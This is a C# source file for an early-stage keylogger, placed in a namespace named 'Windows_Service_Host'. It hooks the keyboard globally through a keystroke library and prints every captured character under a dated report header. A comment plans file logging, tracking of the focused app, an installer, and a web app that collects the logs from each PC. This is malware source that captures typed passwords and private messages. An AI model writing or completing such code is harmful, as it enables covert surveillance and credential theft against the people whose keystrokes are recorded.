using System;
using System.Drawing;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Keystroke.API;
using System.ComponentModel;
using System.IO;
using System.Windows.Markup;
using System.Runtime.InteropServices;
using System.Threading;
using System.Diagnostics;

/* Features to add
 * 1. Writing to text file
 * 2. Being able to tell which app is in focus
 * 3. Separating Reports by Date and Hour
 * 4. Creating the web app (login page, registration page, PC page, organize reports by date, database)
 * 5. Creating an installer
 * 6. Sending the .txt files to the correct user account and PC
 */

namespace Windows_Service_Host
{
    class Keylogger
    {
        private static void Loop()
        {
            
        }

        public static string getMonth(int month)
        {
            string strMonth = "Unknown";
            switch (month)
            {
                case 1:
                    strMonth = "January";
                    break;
                case 2:
                    strMonth = "February";
                    break;
                case 3:
                    strMonth = "March";
                    break;
                case 4:
                    strMonth = "April";
                    break;
                case 5:
                    strMonth = "May";
                    break;
                case 6:
                    strMonth = "June";
                    break;
                case 7:
                    strMonth = "July";
                    break;
                case 8:
                    strMonth = "August";
                    break;
                case 9:
                    strMonth = "September";
                    break;
                case 10:
                    strMonth = "October";
                    break;
                case 11:
                    strMonth = "November";
                    break;
                case 12:
                    strMonth = "December";
                    break;
            }
            return strMonth;
        }
        static void Main(string[] args)
        {
            using (var api = new KeystrokeAPI())
            {
                int year = DateTime.Now.Year;
                int month_raw = DateTime.Now.Month;
                string month = getMonth(month_raw);
                int day = DateTime.Now.Day;
                Console.Write("Keylogger Report for ");
                Console.WriteLine(day + " " + month + " " + year);
                
                api.CreateKeyboardHook((character) => {Console.Write(character);});
                Application.Run();
            }
        }
    }
}
